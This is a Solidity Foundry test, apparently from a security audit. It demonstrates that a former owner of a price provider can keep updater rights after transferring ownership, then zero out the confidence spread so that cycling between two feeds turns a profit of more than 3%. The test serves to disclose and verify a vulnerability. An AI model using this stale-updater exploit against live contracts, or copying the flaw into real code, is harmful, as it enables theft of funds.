// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

import {PriceProvider} from "../contracts/PriceProvider.sol";
import {PriceProviderFactory} from "../contracts/PriceProviderFactory.sol";
import {IOffchainOracle} from "../contracts/interfaces/IOffchainOracle.sol";

contract StaleUpdaterOracle is IOffchainOracle {
    struct Feed {
        uint256 mid;
        uint256 spreadBps;
        uint256 refTime;
    }

    mapping(bytes32 feedId => Feed) private _feeds;

    function setFeed(bytes32 feedId, uint256 mid, uint256 spreadBps, uint256 refTime) external {
        _feeds[feedId] = Feed(mid, spreadBps, refTime);
    }

    function price(bytes32 feedId, address)
        external
        view
        returns (uint256 mid, uint256 spread, uint16 spread1, uint256 refTime)
    {
        Feed memory feed = _feeds[feedId];
        return (feed.mid, feed.spreadBps, 0, feed.refTime);
    }

    function priceGuard(bytes32) external pure override returns (uint128, uint128) {
        return (0, 0);
    }

    function getOracleData(bytes32) external pure override returns (OracleData memory data) {
        return data;
    }

    function getOracleDataBulk(bytes32[] calldata) external pure override returns (OracleData[] memory data) {
        return data;
    }
}

contract PriceProviderOwnershipStaleUpdaterAuditTest is Test {
    uint256 private constant Q64 = 1 << 64;
    uint256 private constant MAX_CONFIDENCE = 1_000_000;
    uint256 private constant INPUT = 1_000 ether;

    address private constant FORMER_OWNER = address(0xA11CE);
    address private constant NEW_OWNER = address(0xB0B);
    address private constant BASE = address(0xBEEF);
    address private constant QUOTE = address(0xCAFE);

    bytes32 private constant LOW_FEED = keccak256("LOW_FEED");
    bytes32 private constant HIGH_FEED = keccak256("HIGH_FEED");

    PriceProviderFactory private factory;
    StaleUpdaterOracle private oracle;
    PriceProvider private lowProvider;
    PriceProvider private highProvider;

    function setUp() public {
        vm.warp(1_800_000_000);

        factory = new PriceProviderFactory(address(this));
        oracle = new StaleUpdaterOracle();

        // Both observations are fresh and remain unchanged throughout the test.
        // Their 5% uncertainty bands overlap, so preserving the full spread makes
        // a LOW -> HIGH cycle unprofitable.
        oracle.setFeed(LOW_FEED, 100e8, 500, block.timestamp);
        oracle.setFeed(HIGH_FEED, 104e8, 500, block.timestamp);

        vm.startPrank(FORMER_OWNER);
        lowProvider = PriceProvider(factory.createPriceProvider(address(oracle), LOW_FEED, 1e15, 1 days, BASE, QUOTE));
        highProvider = PriceProvider(factory.createPriceProvider(address(oracle), HIGH_FEED, 1e15, 1 days, BASE, QUOTE));
        vm.stopPrank();

        address[] memory providers = _providers();
        uint256[] memory confidence = new uint256[](2);
        confidence[0] = MAX_CONFIDENCE;
        confidence[1] = MAX_CONFIDENCE;

        vm.prank(FORMER_OWNER);
        factory.setConfidence(providers, confidence);
    }

    function test_formerOwnerRetainsQuoteControlAfterOwnershipTransfer() public {
        uint256 outputBefore = _cycleOutput();
        assertLt(outputBefore, INPUT, "full oracle bands should make the cycle unprofitable");

        vm.startPrank(FORMER_OWNER);

        // A provider owner can leave itself (or any hidden delegate) authorized
        // as an updater before handing ownership to another party.
        factory.grantUpdater(address(lowProvider), FORMER_OWNER);
        factory.grantUpdater(address(highProvider), FORMER_OWNER);
        factory.transferProviderOwnership(address(lowProvider), NEW_OWNER);
        factory.transferProviderOwnership(address(highProvider), NEW_OWNER);

        vm.stopPrank();

        assertEq(factory.providerOwner(address(lowProvider)), NEW_OWNER);
        assertEq(factory.providerOwner(address(highProvider)), NEW_OWNER);
        assertTrue(factory.isUpdater(address(lowProvider), FORMER_OWNER));
        assertTrue(factory.isUpdater(address(highProvider), FORMER_OWNER));

        vm.warp(block.timestamp + lowProvider.CONFIDENCE_COOLDOWN());

        uint256[] memory collapsedConfidence = new uint256[](2);
        // Zero is within the factory-enforced bounds. It removes the oracle's
        // uncertainty spread and leaves only the small immutable margin step.
        vm.prank(FORMER_OWNER);
        factory.setConfidence(_providers(), collapsedConfidence);

        uint256 outputAfter = _cycleOutput();
        uint256 profit = outputAfter - INPUT;
        uint256 profitBps = Math.mulDiv(profit, 10_000, INPUT);

        emit log_named_decimal_uint("cycle input", INPUT, 18);
        emit log_named_decimal_uint("cycle output before stale update", outputBefore, 18);
        emit log_named_decimal_uint("cycle output after stale update", outputAfter, 18);
        emit log_named_uint("profit after ownership transfer (bps)", profitBps);

        assertGt(outputAfter, INPUT, "stale updater makes unchanged feeds profitable to cycle");
        assertGt(profitBps, 300, "economic impact should exceed 3% per idealized cycle");
    }

    function _cycleOutput() private returns (uint256 output) {
        (, uint128 lowAsk) = lowProvider.getBidAndAskPrice();
        (uint128 highBid,) = highProvider.getBidAndAskPrice();

        uint256 baseOut = Math.mulDiv(INPUT, Q64, lowAsk);
        output = Math.mulDiv(baseOut, highBid, Q64);
    }

    function _providers() private view returns (address[] memory providers) {
        providers = new address[](2);
        providers[0] = address(lowProvider);
        providers[1] = address(highProvider);
    }
}
